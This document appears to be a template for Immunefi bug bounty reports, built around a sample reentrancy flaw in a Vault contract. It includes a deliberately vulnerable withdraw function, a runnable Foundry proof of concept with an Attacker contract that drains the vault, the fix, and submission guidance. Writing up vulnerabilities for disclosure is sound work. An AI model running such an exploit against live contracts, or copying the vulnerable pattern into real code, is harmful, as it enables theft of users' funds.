# Immunefi Bug Bounty Report Template

Template for Immunefi bug bounty submissions.

---

## Dashboard Submission Format

Immunefi uses a structured dashboard form. Each section must be filled correctly.

---

## Report Structure

### 1. Bug Description

```markdown
## Summary

A reentrancy vulnerability exists in the `withdraw()` function of `Vault.sol` that allows
an attacker to drain all funds from the contract by exploiting the CEI pattern violation.

## Vulnerability Details

### Location
- **Contract:** `Vault.sol`
- **Function:** `withdraw(uint256 amount)`
- **Lines:** 100-110
- **Commit:** `abc123...`

### Root Cause

The function makes an external call to transfer ETH before updating the user's balance:

```solidity
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient");

    // VULNERABILITY: External call before state update
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");

    // State update happens AFTER external call
    balances[msg.sender] -= amount;
}
```

This violates the Checks-Effects-Interactions (CEI) pattern, allowing an attacker to
re-enter the function before the balance is decremented.

### Attack Vector

1. Attacker deploys a contract with a malicious `receive()` function
2. Attacker deposits a small amount (e.g., 1 ETH)
3. Attacker calls `withdraw(1 ether)`
4. During the ETH transfer, attacker's `receive()` is triggered
5. In `receive()`, attacker calls `withdraw(1 ether)` again
6. Steps 4-5 repeat until the vault is drained
7. All state updates execute in reverse order, each seeing sufficient balance
```

### 2. Impact

```markdown
## Impact

### Severity: Critical

### Assets at Risk
- All ETH deposited in the Vault contract
- Current TVL: Approximately $X million (as of YYYY-MM-DD)

### Attack Requirements
- Attacker needs: Minimal ETH for initial deposit (~0.1 ETH)
- Technical skill: Moderate (deploy contract, call functions)
- External dependencies: None
- Time window: Unlimited (vulnerability is permanent)

### Consequences
1. **Direct Fund Loss:** 100% of vault TVL can be stolen
2. **User Impact:** All depositors lose their funds
3. **Protocol Impact:** Complete loss of user trust, potential legal liability

### Affected Users
- All current depositors
- Anyone who deposits before fix is deployed
```

### 3. Proof of Concept

```markdown
## Proof of Concept

### Environment Setup

1. Clone the repository: `git clone https://github.com/protocol/contracts`
2. Install dependencies: `forge install`
3. Create test file: `test/ReentrancyPoC.t.sol`

### PoC Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract ReentrancyPoC is Test {
    Vault public vault;
    Attacker public attacker;

    function setUp() public {
        // Deploy vulnerable vault
        vault = new Vault();

        // Seed vault with "victim" funds
        vm.deal(address(this), 100 ether);
        vault.deposit{value: 100 ether}();

        // Deploy attacker contract
        attacker = new Attacker(payable(address(vault)));
    }

    function test_DrainVault() public {
        // Give attacker initial funds
        vm.deal(address(attacker), 1 ether);

        // Record balances before attack
        uint256 vaultBalanceBefore = address(vault).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;

        console.log("=== Before Attack ===");
        console.log("Vault balance:", vaultBalanceBefore);
        console.log("Attacker balance:", attackerBalanceBefore);

        // Execute attack
        attacker.attack();

        // Record balances after attack
        uint256 vaultBalanceAfter = address(vault).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;

        console.log("=== After Attack ===");
        console.log("Vault balance:", vaultBalanceAfter);
        console.log("Attacker balance:", attackerBalanceAfter);
        console.log("Attacker profit:", attackerBalanceAfter - attackerBalanceBefore);

        // Assertions
        assertEq(vaultBalanceAfter, 0, "Vault should be drained");
        assertGt(attackerBalanceAfter, 100 ether, "Attacker should have stolen funds");
    }
}

contract Attacker {
    Vault public vault;
    uint256 public attackAmount = 1 ether;

    constructor(address payable _vault) {
        vault = Vault(_vault);
    }

    function attack() external {
        vault.deposit{value: attackAmount}();
        vault.withdraw(attackAmount);
    }

    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            vault.withdraw(attackAmount);
        }
    }
}
```

### Execution

```bash
forge test --match-test test_DrainVault -vvv
```

### Expected Output

```
=== Before Attack ===
Vault balance: 101000000000000000000
Attacker balance: 1000000000000000000

=== After Attack ===
Vault balance: 0
Attacker balance: 102000000000000000000
Attacker profit: 101000000000000000000

[PASS] test_DrainVault()
```
```

### 4. Recommendation

```markdown
## Recommendation

### Immediate Fix

Add the `nonReentrant` modifier from OpenZeppelin:

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Vault is ReentrancyGuard {
    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient");
        balances[msg.sender] -= amount;  // Update state FIRST
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

### Alternative Fixes

1. **CEI Pattern:** Always update state before external calls
2. **Pull Pattern:** Use withdrawals where users pull funds instead of push
3. **Check-Lock Pattern:** Implement custom mutex lock
```

---

## Severity Classification (Immunefi Standard)

| Severity | Impact | Typical Payout |
|----------|--------|----------------|
| **Critical** | Direct theft of funds, permanent protocol damage | $10,000 - $10,000,000+ |
| **High** | Theft with limitations, significant disruption | $5,000 - $50,000 |
| **Medium** | Limited theft, conditional exploits | $1,000 - $10,000 |
| **Low** | Minor issues, edge cases | $100 - $1,000 |

---

## Submission Checklist

- [ ] Bug Description is clear and technical
- [ ] Impact uses correct severity from program's impact list
- [ ] Asset is selected from program's asset list (don't create custom)
- [ ] PoC is runnable and demonstrates the vulnerability
- [ ] PoC is placed in the Proof of Concept field (not Bug Description)
- [ ] Recommendation is actionable and specific
- [ ] No sensitive information (private keys, personal data) included
- [ ] Checked that issue is not in known issues / out of scope

---

## Best Practices

1. **Use Program's Impact List** - Select from predefined impacts, don't create custom
2. **Use Program's Asset List** - Select from predefined assets
3. **Runnable PoC Required** - Most programs require executable PoC for High/Critical
4. **Be Specific** - Vague reports get triaged low priority
5. **One Issue Per Report** - Don't bundle multiple vulnerabilities
6. **Include All Context** - Deployment addresses, chain IDs, etc.
7. **Follow Disclosure Guidelines** - Don't disclose publicly before resolution

---

## Common Rejection Reasons

- Out of scope contracts/functions
- Known issues listed in program
- No working PoC for claimed severity
- Theoretical attack without realistic path
- Requires compromised admin keys
- Gas griefing without significant impact
- Already reported by another researcher (duplicate)
